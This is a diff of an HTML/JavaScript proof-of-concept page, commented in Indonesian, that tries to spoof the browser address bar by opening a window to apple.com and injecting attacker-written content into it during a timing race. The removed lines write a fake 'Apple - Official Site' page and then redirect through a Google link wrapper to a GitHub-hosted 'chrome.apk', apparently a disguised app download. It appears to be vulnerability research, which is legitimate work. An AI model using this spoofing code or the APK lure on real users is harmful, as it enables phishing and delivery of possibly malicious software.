@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
-    <title>About:Blank Bypass & Port 90 PoC</title>
+    <title>Direct URL Spoofing PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -44,7 +44,7 @@
   </head>
   <body>
     <div class="container">
-      <button id="execBtn">INITIALIZE BYPASS & PORT 90 TEST</button>
+      <button id="execBtn">INITIALIZE DIRECT SPOOF TEST</button>
       <div class="info" id="statusInfo">Status: Ready for interaction.</div>
     </div>
 
@@ -53,71 +53,61 @@
       let statusInfo = document.getElementById("statusInfo");
 
       execButton.onclick = function () {
-        statusInfo.innerText = "Status: Opening blank context window (Bypassing initial load)...";
+        statusInfo.innerText = "Status: Initializing direct URL dispatch...";
         this.style.display = "none";
 
-        // 1. Membuka jendela baru kosong tanpa URL awal (metode bypass about:blank murni)
-        let targetWindow = window.open("", "_blank");
-
-        if (!targetWindow) {
-          statusInfo.innerText = "Status: Execution halted - Pop-up blocked by browser policy.";
-          execButton.style.display = "block";
-          return;
-        }
-
         try {
-          statusInfo.innerText = "Status: Injecting deceptive DOM structure...";
+          // Membuka jendela baru langsung dengan target URL (misalnya apple.com:90)
+          // untuk memaksa bilah alamat segera mencoba memuat URL tersebut tanpa tertahan di about:blank
+          let targetWindow = window.open("https://apple.com", "_blank");
 
-          // 2. Menyuntikkan payload HTML secara instan ke dalam konteks jendela baru
-          let payloadHTML = `
-            <!DOCTYPE html>
-            <html>
-            <head>
-              <meta name="viewport" content="width=device-width, initial-scale=1.0">
-              <title>Apple - Official Site</title>
-              <style>
-                body {
-                  margin: 0; background: #ffffff; color: #1d1d1f;
-                  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-                  display: flex; align-items: center; justify-content: center;
-                  height: 100vh; text-align: center; padding: 20px; box-sizing: border-box;
-                }
-                .wrapper { width: 100%; max-width: 500px; }
-                h1 { font-size: 40px; color: #d70015; margin-bottom: 12px; font-weight: 700; }
-                p { font-size: 22px; color: #0066cc; font-weight: 500; margin: 0; }
-              </style>
-            </head>
-            <body>
-              <div class="wrapper">
-                <h1>NOT APPLE</h1>
-                <p>Custom Port 90 State Evaluation</p>
-              </div>
-            </body>
-            </html>
-          `;
+          if (!targetWindow) {
+            statusInfo.innerText = "Status: Execution halted - Pop-up blocked by browser policy.";
+            execButton.style.display = "block";
+            return;
+          }
 
-          targetWindow.document.open();
-          targetWindow.document.write(payloadHTML);
-          targetWindow.document.close();
+          statusInfo.innerText = "Status: Target URL dispatched to address bar.";
 
-          statusInfo.innerText = "Status: DOM committed. Synchronizing timing sequence...";
-
-          // 3. Menggunakan location.replace dengan port 90 setelah jeda waktu render
+          // Mencoba menyuntikkan dokumen jika celah waktu (race window) mengizinkan sebelum koneksi port 90 gagal
           setTimeout(() => {
             try {
-              statusInfo.innerText = "Status: Dispatching transition to apple.com:90...";
+              let attackerPayload = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                  <title>Attacker Page</title>
+                  <style>
+                    body {
+                      margin: 0; background: #000000; color: #00ff00;
+                      font-family: monospace; display: flex; align-items: center; 
+                      justify-content: center; height: 100vh; text-align: center;
+                    }
+                    h1 { font-size: 32px; color: #ff0000; }
+                  </style>
+                </head>
+                <body>
+                  <div>
+                    <h1>ATTACKER PAGE INJECTED</h1>
+                    <p>Forced Over Port 90 State</p>
+                  </div>
+                </body>
+                </html>
+              `;
               
-              // Mengarahkan ke target menggunakan port 90
-              targetWindow.location.replace("www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3");
-
-              statusInfo.innerText = "Status: Transition dispatched successfully.";
-            } catch (navError) {
-              statusInfo.innerText = "Status: Navigation restricted: " + navError.message;
+              // Mencoba menulis ke dokumen target (akan dibatasi SOP jika navigasi lintas domain berhasil, 
+              // tetapi diuji untuk melihat perilaku penanganan bilah alamat)
+              targetWindow.document.open();
+              targetWindow.document.write(attackerPayload);
+              targetWindow.document.close();
+            } catch (innerErr) {
+              console.debug("Cross-origin injection restricted by browser policy:", innerErr.message);
             }
-          }, 1000);
+          }, 300);
 
         } catch (err) {
-          statusInfo.innerText = "Status: Execution error encountered: " + err.message;
+          statusInfo.innerText = "Status: Execution error: " + err.message;
         }
       };
     </script>
